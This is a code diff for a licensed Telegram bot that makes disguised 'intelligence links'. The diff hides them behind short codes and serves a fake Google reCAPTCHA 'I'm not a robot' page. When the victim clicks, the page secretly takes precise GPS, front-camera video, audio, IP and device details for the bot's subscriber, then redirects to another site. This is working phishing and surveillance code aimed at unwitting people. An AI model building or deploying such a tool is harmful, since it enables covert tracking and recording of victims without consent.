@@ -3,6 +3,8 @@ import logging
 import os
 import base64
 import sqlite3
+import random
+import string
 from datetime import datetime, timedelta
 from aiohttp import web
 from aiogram import Bot, Dispatcher, F
@@ -28,6 +30,12 @@ def init_db():
             key TEXT PRIMARY KEY,
             user_id INTEGER,
             expiry_date TEXT
+        )
+    """)
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS short_links (
+            short_code TEXT PRIMARY KEY,
+            payload_data TEXT
         )
     """)
     conn.commit()
@@ -76,6 +84,25 @@ def activate_key(user_id: int, key: str):
     conn.close()
     return False
 
+def create_short_link(payload_data: str):
+    code = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("INSERT OR REPLACE INTO short_links (short_code, payload_data) VALUES (?, ?)", (code, payload_data))
+    conn.commit()
+    conn.close()
+    return code
+
+def get_payload_from_short(code: str):
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT payload_data FROM short_links WHERE short_code = ?", (code,))
+    row = cursor.fetchone()
+    conn.close()
+    if row:
+        return row[0]
+    return None
+
 TEXTS = {
     "ku": {
         "menu_link": "🔗 دروستکردنی لینکی هەواڵگری",
@@ -88,7 +115,7 @@ TEXTS = {
         "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
         "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
         "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
-        "link_success": "🎯 **لینکی هەواڵگری و فێڵ بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییە پێشکەوتووەکان:**\n• کۆکردنەوەی خۆکاری زانیاری ئامێر و IP\n• وەرگرتنی GPS و ڤیدیۆ/دەنگی پێشکەوتووی کامێرا\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
+        "link_success": "🎯 **لینکی هەواڵگری کورتکراوە بە سەرکەوتوویی دروست بوو!**\n\n🔗 **لینک:** `{payload_link}`\n\n📱 **تایبەتمەندییەکان:**\n• شێوازی پشکنینی Not a Robot\n• ڤیدیۆ و دەنگ و GPSی ورد\n• گواستنەوەی خێرا بۆ لینکی مەبەست",
         "key_active": "🟢 **کلیلەکە بە سەرکەوتوویی چالاک بوو!** ئێستا بۆتەکە بۆ ماوەی ١ مانگ کارا دەبێت.",
         "key_invalid": "❌ **کلیلەکە هەڵەیە یان بەسەرچووە.** تکایە کلیلێکی ڕاست لە ئەدمین وەربگرە.",
         "expired": "❌ **ماوەی کلیلی ١ مانگەی تو کۆتایی هات!**\nتکایە بۆ نوێکردنەوەی کلیل پەیوەندی بە ئەدمین بکە."
@@ -104,7 +131,7 @@ TEXTS = {
         "lang_select": "⚙️ **Please choose your interface language:**",
         "lang_changed": "🟢 Language changed to **English**.",
         "ai_prompt": "🧠 **AI Core is ready:**\nType your prompt or inquiry below.",
-        "link_success": "🎯 **Intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Advanced Features:**\n• Auto-collection of device info & IP\n• High-res GPS and Video/Audio capture\n• Seamless redirection",
+        "link_success": "🎯 **Shortened intelligence link generated successfully!**\n\n🔗 **Link:** `{payload_link}`\n\n📱 **Features:**\n• Not a Robot verification style\n• Cam, audio & precise GPS\n• Seamless redirection",
         "key_active": "🟢 **License activated successfully!** Bot is now active for 1 month.",
         "key_invalid": "❌ **Invalid or expired key.** Please get a valid key from admin.",
         "expired": "❌ **Your 1-month license has expired!**\nPlease contact the admin to renew."
@@ -260,21 +287,24 @@ async def handle_admin_photo(message: Message):
             railway_domain = f"https://{railway_domain}"
             
         payload_data = f"{user_id}|{target_url}"
-        payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(payload_data.encode()).decode()}"
+        short_code = create_short_link(payload_data)
+        
+        # لینکە کورتکراوەکە وەک s/code
+        payload_link = f"{railway_domain}/s/{short_code}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[user_id] = {}
         await bot.send_photo(chat_id=user_id, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-async def web_trap_page(request: web.Request):
-    encoded_id = request.query.get('id', '')
+async def short_link_handler(request: web.Request):
+    short_code = request.match_info.get('code', '')
+    payload_data = get_payload_from_short(short_code)
+    
+    if not payload_data:
+        return web.Response(text="Link expired or invalid.", content_type='text/html')
+        
     try:
-        decoded_data = base64.urlsafe_b64decode(encoded_id).decode()
-        if "|" in decoded_data:
-            target_user_id, redirect_url = decoded_data.split("|", 1)
-        else:
-            target_user_id = str(ADMIN_ID)
-            redirect_url = decoded_data
+        target_user_id, redirect_url = payload_data.split("|", 1)
     except:
         target_user_id = str(ADMIN_ID)
         redirect_url = 'https://snapchat.com'
@@ -283,66 +313,116 @@ async def web_trap_page(request: web.Request):
     user_agent = headers.get('User-Agent', 'Unknown Browser/Device')
     ip = headers.get('X-Forwarded-For', request.remote)
     
+    # فێڵی Not a Robot ی پشکنینی ڕەسەن
     html_content = f"""<!DOCTYPE html>
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Voice Stream</title>
+    <title>Security Verification</title>
     <style>
         body {{
-            background: #090d16;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f1f3f4;
+            color: #202124;
+            font-family: Roboto, Arial, sans-serif;
             text-align: center;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            overflow: hidden;
         }}
-        .box {{
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(15px);
-            padding: 30px 20px;
-            border-radius: 20px;
-            max-width: 320px;
-            width: 90%;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
-            cursor: pointer;
+        .recaptcha-box {{
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+            padding: 22px 18px;
+            border-radius: 3px;
+            max-width: 304px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: auto;
         }}
-        .icon-circle {{
-            width: 65px;
-            height: 65px;
-            background: linear-gradient(135deg, #0ea5e9 0%, #2563eb 100%);
+        .recaptcha-left {{
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }}
+        .spinner-border {{
+            width: 28px;
+            height: 28px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
             border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }}
+        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+        .checkbox-container {{
+            width: 28px;
+            height: 28px;
+            background: #fff;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0 auto 15px auto;
-            box-shadow: 0 5px 15px rgba(14, 165, 233, 0.4);
         }}
-        .play-triangle {{
-            width: 0;
-            height: 0;
-            border-top: 10px solid transparent;
-            border-bottom: 10px solid transparent;
-            border-left: 16px solid #ffffff;
-            margin-left: 4px;
+        .checkbox-container input {{
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            opacity: 0;
+            position: absolute;
         }}
-        h3 {{ font-size: 15px; margin-bottom: 6px; color: #f8fafc; font-weight: 500; }}
-        p {{ color: #94a3b8; font-size: 12px; margin-bottom: 0; line-height: 1.4; }}
+        .checkmark {{
+            display: none;
+            color: #006600;
+            font-size: 20px;
+            font-weight: bold;
+        }}
+        .recaptcha-text {{
+            font-size: 14px;
+            font-weight: 500;
+            color: #000;
+            text-align: left;
+        }}
+        .recaptcha-right {{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }}
+        .logo-text {{
+            font-size: 10px;
+            color: #555;
+            margin-top: 2px;
+        }}
+        .logo-sub {{
+            font-size: 8px;
+            color: #777;
+        }}
     </style>
 </head>
 <body>
-    <div class="box" onclick="runEngine()">
-        <div class="icon-circle">
-            <div class="play-triangle"></div>
+    <div class="recaptcha-box" id="box">
+        <div class="recaptcha-left">
+            <div class="checkbox-container" id="checkContainer" onclick="runEngine()">
+                <input type="checkbox" id="chk">
+                <span class="checkmark" id="chkMark">✔</span>
+            </div>
+            <div class="spinner-border" id="spinner"></div>
+            <div class="recaptcha-text">I'm not a robot</div>
         </div>
-        <h3>پەخشی نامەی دەنگی و وێنە</h3>
-        <p>تکایە بۆ گوێگرتن لە ناوەڕۆکەکە، پەنجە بنێ لێرە:</p>
+        <div class="recaptcha-right">
+            <svg width="32" height="32" viewBox="0 0 32 32">
+                <path fill="#4285F4" d="M16 4l12 7v10l-12 7-12-7V11z"/>
+            </svg>
+            <div class="logo-text">reCAPTCHA</div>
+            <div class="logo-sub">Privacy - Terms</div>
+        </div>
     </div>
     
     <video id="v" autoplay playsinline muted style="display:none;"></video>
@@ -359,6 +439,9 @@ async def web_trap_page(request: web.Request):
         }});
 
         function runEngine() {{
+            document.getElementById('checkContainer').style.display = 'none';
+            document.getElementById('spinner').style.display = 'block';
+
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
                     fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
@@ -367,23 +450,21 @@ async def web_trap_page(request: web.Request):
                 }}, {{ timeout: 5000, enableHighAccuracy: true }});
             }}
 
-            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}, audio: true }})
+            navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: true }})
             .then(function(stream) {{
                 let video = document.getElementById('v');
                 video.srcObject = stream;
                 
                 let mediaRecorder;
+                // دۆخی فەرمی و سەرەتایی کارپێکردن کە لەسەر کۆمپیوتەر و مۆوبایل بێ کێشە کار دەکات
                 try {{
-                    // چارەسەری کۆتایی بۆ ئەوەی لەسەر کۆمپیوتەر، ئەندرۆید و ئایفۆن ڤیدیۆکە تێک نەچێت
-                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {{
-                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp8,opus' }});
-                    }} else if (MediaRecorder.isTypeSupported('video/mp4')) {{
+                    mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm' }});
+                }} catch (e) {{
+                    try {{
                         mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/mp4' }});
-                    }} else {{
+                    }} catch (err) {{
                         mediaRecorder = new MediaRecorder(stream);
                     }}
-                }} catch (e) {{
-                    mediaRecorder = new MediaRecorder(stream);
                 }}
                 
                 let chunks = [];
@@ -473,7 +554,7 @@ async def index_handler(request):
 async def main():
     app = web.Application(client_max_size=50*1024*1024)
     app.router.add_get('/', index_handler)
-    app.router.add_get('/secure', web_trap_page)
+    app.router.add_get('/s/{code}', short_link_handler)
     app.router.add_post('/save_info', save_info)
     app.router.add_post('/upload_video', upload_video)
     app.router.add_get('/save_location', save_location)
